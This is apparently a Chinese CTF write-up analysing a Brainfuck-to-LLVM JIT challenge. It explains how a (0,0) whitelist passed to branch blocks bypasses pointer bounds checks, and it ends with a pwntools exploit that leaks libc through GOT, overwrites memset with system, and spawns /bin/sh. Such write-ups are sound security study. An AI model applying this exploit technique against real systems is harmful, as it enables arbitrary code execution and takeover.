# 题目审计
题目文件给了一个main.py和runtime.so

 - main.py是主程序，读取brainfuck代码作为，然后使用llvm对代码执行jit编译并执行。
- runtime.so是一个提供读取输出分配内存函数的运行库

调试方法：
```
gdb python
gdb> run main.py
```
# main.py分析

## 解析器
实现于```class bfProgram:def __init__ (self, c):```
解析器检测中括号将程序分为多个部分，并将token转化为抽象指令。

指令的格式为```(op,value)```
- 0：无操作
- 1：移动指针
- 2：给指针所指字节赋值
- 3：打印指针所指字节
- 4：读取指针所指字节
例如：<<>>> (1,1) +--- (2,-2)

遇到中括号时，解析器会将程序分为三部分
```<head><br1><br2>```，若任意部分含有中括号则继续处理，即递归处理。

## 代码生成
实现于```class bfProgram:codegen(self, module, whitelist=None):```

首先会检测输入程序是否为linear code，分别进行不同的codegen流程。

### linear code
每个抽象指令的op都对应一系列llvm指令，对于操作码1 ，首先取出当前指针，然后对指针加value的值后，重新存储指针，指针存储于```dptr_ptr```
```
elif op == 1:
    if imm != 0:
        ori = builder.ptrtoint(builder.load(dptr_ptr), i64)
        incr = llvmIR.Constant(i64, imm)
        new = builder.inttoptr(builder.add(ori, incr), i8_ptr)
        builder.store(new, dptr_ptr)
        rel_pos += imm
```
对于op 2，3，4增加了检测代码
```
if not is_safe(rel_pos, whitelist_cpy):
    print(self.code)
    sptr = builder.load(sptr_ptr)
    cur = builder.ptrtoint(dptr, i64)
    start = builder.ptrtoint(sptr, i64)
    bound = builder.add(start, llvmIR.Constant(i64, 0x3000))
    builder.call(ptrBoundCheck, [start, bound, cur])
    whitelist_cpy = whitelist_add(whitelist_cpy, rel_pos)
```
首先```is_safe```检查```rel_pos```是否在whitelist_cpy内部，whitelist是一个2个值的元组，存储有效指针的范围，如果```rel_pos```不在whitelist范围内则调用ptrBoundCheck(实现于runtime.so)。
```
//合法范围为0x3000
void ptrBoundCheck(ulong start,ulong bound,ulong cur)
{
  if ((start <= cur) && (cur <= bound)) {
    return;
  }
  fprintf(stderr, "assert (0x%lx < 0x%lx < 0x%lx)!!\n", start, cur, bound);
  exit(-1);
}
```
whitelist的存在事实上是对程序的优化，否则每次对指针进行操作都需要添加ptrBoundCheck，而添加whitelist后只需要对首次越出whitelist范围的指针进行检测。

### Branch
当程序存在中括号的时候，程序将被拆分为多个部分，并且这些部分将被单独处理，整个过程是递归完成的。之后在每个块生成LLVM IR后使用条件分支将各个块链接到一起。
漏洞点在于：
```
headb = self.head.codegen(module)
br1b = self.br1.codegen(module, (0, 0))
br2b = self.br2.codegen(module, (0, 0))
```
第二行第三行，传递白名单的方式为0，0，而不是None，这将导致```is_safe(0, whitelist_cpy)```返回true，因此ptrBoundsCheck不会被加入该代码块。
也就是在将指针越界移动后，再进行分支，保持rel_pos的值为0就可以对越界指针所指的位置进行操作。

## Vulnerability
1.指针移动并没有进行检查
我们可以任意移动指针到任何位置
2.is_safe
```
def is_safe(v, wl):
	if wl == None:
		return False
	a1, a2 = wl
	return v >= a1 and v <= a2
```
is_safe(0, (0,0))将会返回true
3.rel_pos
rel_pos在每个块开始生成llvm ir的时候都会置0。
结合以上三个漏洞我们可以任意地址读写。

## 利用
data起始含有两个指针，分别为data段起始指针和当前指针

1.更改start pointer为GOT处
2.更改data pointer为GOT处
3.泄露libc地址
4.覆盖memset为system
5.写/bin/sh
exp
```
def exploit(r):
	# leak libc
	r.sendlineafter(">>> ", "[.]<<<<<<<<[.,<<<<<<<<]>>>>>>>>>[.>]")
	r.sendafter(chr(0x90), chr(0x30-1))
	r.sendafter(chr(0x80), chr(0x30-1))
	libc_base = u64(r.recvn(6).ljust(8, '\x00'))-libc.symbols["read"]
	log.info("libc_base: {:#x}".format(libc_base))

	# prepare /bin/sh
	r.sendlineafter(">>> ", "+.,>,>,>,>,>,>,>,<<<<<<<"+"[<<<<<<<<[.,<<<<<<<<]>>>>>>>>>.[,>]]")
	r.sendafter(chr(1), "/bin/sh\x00")
	r.sendafter(chr(0x90), chr(0x28-1))
	r.sendafter(chr(0x80), chr(0x28-1))
	r.recvn(1)
	r.send(p64(libc_base+libc.symbols["system"])[:-2])
	r.interactive()
```